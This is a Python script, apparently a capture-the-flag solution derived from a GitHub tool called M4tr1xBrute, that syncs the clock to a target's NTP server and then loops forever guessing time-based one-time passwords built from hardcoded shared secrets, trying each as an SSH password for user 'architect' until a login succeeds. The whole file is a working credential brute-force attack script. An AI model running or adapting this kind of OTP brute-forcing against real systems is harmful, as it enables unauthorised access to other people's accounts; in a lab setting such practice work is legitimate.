import time, subprocess, random, sys, os
import paramiko 
import ntplib
# import traceback as tb
from time import ctime
from hashlib import sha256
from datetime import datetime, timedelta

#shared secret token for OTP calculation
sharedSecret1 = 128939448577488
sharedSecret2 = 592988748673453
sharedSecret3 = 792513759492579
USER = "architect"
RHOST = "10.10.249.138" # LinuxBayServerIPv4Address_HERE!!! CHANGE UPON AttackBox ReInstantiated...!!!

"""
M4tr1xBrute.py: 
Methods: ntplib.NTPClient, 
TimeSet: (Input Args) country:str, hours: int,str, mins: int,str, seconds: str,int -> int
getRandom: (Input Args): N/A -> str
Description: Derived from GeardoRanger GitHub M4tr1xBrute.py(https://github.com/GeardoRanger/M4tr1xBrute).
Attempting to establish NTPClient Declarations, and verifying successful ssh hacking NTPClient Request via Paramiko 
and run commands for attempted ssh login according to ssh totp diagrams taken from hacking into BlackCat User for the Architect Login...
"""

try:
    print("Setting to UTC...")
    os.system("sudo timedatectl set-timezone UTC")
    print("Establishing NTPClient")
    client = ntplib.NTPClient() #NTPClient Establishment Attempt
    print("Collecting Client Response!...")
    response = client.request(RHOST) # IP of linux-bay server login request on RHOST for response packet Layer 6+ from Transport Layer
    print("ntplib.NTPClient().request({}): response = {}\n".format(RHOST, response)) #Debug Statement: Informational
    os.system("sudo date {}".format(time.strftime('%m%d%H%M%Y.%S', time.localtime(response.tx_time) ) ) )
    # password = str(input("[sudo] password for kali: ") )
    # print("sudo kali root priv accepted...\n Command complete.")
except:
    print('Could not sync with time server.')
    sys.exit()

print('\nTime Sync Completed Successfully.\nConducting brute-force on OTP\n')

secretList = [sharedSecret1, sharedSecret2, sharedSecret3]

def TimeSet(country, hours, mins, seconds):
    now = datetime.now() + timedelta(hours=hours, minutes=mins)
    CurrentTime = int(now.strftime("%d%H%M"))
    # print("M4tr1xBrute: TimeSet: CurrentTime = {}\n".format(CurrentTime) )
    return(CurrentTime)

def getRandom():
    ca = TimeSet('Ukraine', 4, 43, 1)
    cb = TimeSet('Germany', 13, 55, 0)
    cc = TimeSet('England', 9, 19, 1)
    cd = TimeSet('Nigeria', 1, 6, 1)
    ce = TimeSet('Denmark', -5, 18, 1)
    timeSetList = [ca, cb, cc, cd, ce]
    randomTimeSet = random.sample(timeSetList, 3)
    ctt = randomTimeSet[0] * randomTimeSet[1] * randomTimeSet[2]
    # pre_shared_secret = 792513759492579
    pre_shared_secret = random.choice(secretList)
    # print("pre-shared-secret = {}".format(pre_shared_secret))
    uc = ctt ^ pre_shared_secret
    hc = (sha256(repr(uc).encode('utf-8')).hexdigest())
    t = hc[22:44]
    # print("M4tr1xBrute: getRandom: t = {}\n".format(t))
    return t

while True:      
    OTP = getRandom()
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(RHOST, username=USER, password=OTP)
        print("Success with: {}\n".format(OTP))
        print("Executing this command: sshpass -p \'{}\' ssh architect@{}\n\n You have 60 seconds or less to run this command.".format(OTP,RHOST))
        #print("Cannot execute sshpass -p command via remote Rainbow Connection...!!!\nMust copy verbatim from spittle to enter architect@<AttackBoxIPv4Address>!!!\n")
        break
    except:
        print("Connection failed with: {}, trying again!\n".format(OTP))
        # tb.print_exc()
